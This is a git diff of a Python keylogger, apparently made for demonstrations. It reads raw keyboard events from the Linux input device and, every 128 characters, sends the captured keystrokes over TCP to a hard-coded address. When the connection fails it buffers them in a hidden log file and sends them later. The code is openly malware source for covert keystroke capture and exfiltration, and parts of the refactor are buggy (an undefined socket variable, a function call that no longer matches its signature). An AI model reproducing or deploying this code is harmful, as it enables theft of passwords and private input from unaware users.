@@ -9,9 +9,6 @@ Compiled with XYZ for ease of use in demonstrations.
 Written by mowemcfc (jcartermcfc@gmail.com) starting 12/06/2020
 """
 
-RETURN_ADDR = ("192.168.0.2", 80) # This port may not always be open
-                                  # TODO: check multiple ports? configure host for this too
-
 """
 Find character device file associated with keypress events using regex and device information
 """
@@ -45,11 +42,13 @@ Clears file's contents after read.
 def send_logfile(sock, logfile_name, typed):
     with open(logfile_name, "r+") as outf: # read/write mode
         data = outf.readlines()
+
+        if data:
+            sock.sendall(encode(data, "utf-8"))
+
         outf.truncate(0)
         outf.close()   
 
-    if data:
-        sock.sendall(encode(data, "utf-8"))
 
     return
 
@@ -58,9 +57,19 @@ Takes name of logfile and last 128 typed characters as input and writes to logfi
 """
 def write_to_logfile(logfile_name, typed):
     with open(logfile_name, "a") as outf: # append mode
-    outf.write(typed)
-    outf.close()
+        outf.write(typed)
+        outf.close()
 
+"""
+Attempts to establish tcp connection with source PC using (HOST, PORT) tuple return_addr
+If exception is raised (aka connection could not be made, for whatever reason), we ignore,
+this will be handled by the write logic
+"""
+def try_connect_socket(return_addr):
+    try:
+        sock.connect(return_addr)
+    except:
+        pass
 
 """
 Opens special character file associated with keyboard events, reads struct and writes to output file.
@@ -103,24 +112,25 @@ def read_cfile(cfile_path):
     }
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        sock.connect(RETURN_ADDR)
-    except:
-        pass
+    return_addr = ("192.168.0.2", 80) # This port may not always be open
+                                      # TODO: check multiple ports? configure host for this too
+    try_connect_socket(return_addr)
+
 
     input_file = open(cfile_path, "rb")
     keypress = input_file.read(struct_size)
 
+    logfile = open(logfile_name, "w")
+    logfile.close()
+
     typed = ""
+
     while keypress:
         (var1, var2, type, code, value) = struct.unpack(inevent_format, keypress)
-        print(var1, var2, type, code, value)
+        #print(var1, var2, type, code, value)
 
         if sock.fileno() == -1: # If socket is not connected, attempt to reconnect, otherwise ignore - data will be written to file
-            try:
-                sock.connect(RETURN_ADDR)
-            except:
-                pass
+            try_connect_socket(return_addr)
 
         if code != 0 and type == 1 and value == 1: # TODO: write this comment
             if code in qwerty_map:
@@ -128,21 +138,24 @@ def read_cfile(cfile_path):
 
         keypress = input_file.read(struct_size)           
         if len(typed) == 128: # write to file every 128 characters TODO: should this be higher?
+            print("----WRITING----")
             try:
                 if log_needs_send:
                     write_to_logfile(logfile_name, typed)
                     typed = "" # clear input buffer to avoid double handling when exceptions occur
-                    send_logfile(sock, logfile_name, typed)
+                    send_logfile(sock, logfile_name)
                     log_needs_send = False
                 else:
                     sock.sendall(encode(typed, "utf-8")) # encode keypress data as utf-8 string (by default)
             except:
+
                 if not os.path.exists(logfile_name): # create hidden log file
                     logfile = open(logfile_name, "w")
                     logfile.close()
 
                 if typed:
                     write_to_logfile(logfile_name, typed)
+                    typed = ""
                     log_needs_send = True
 
 """
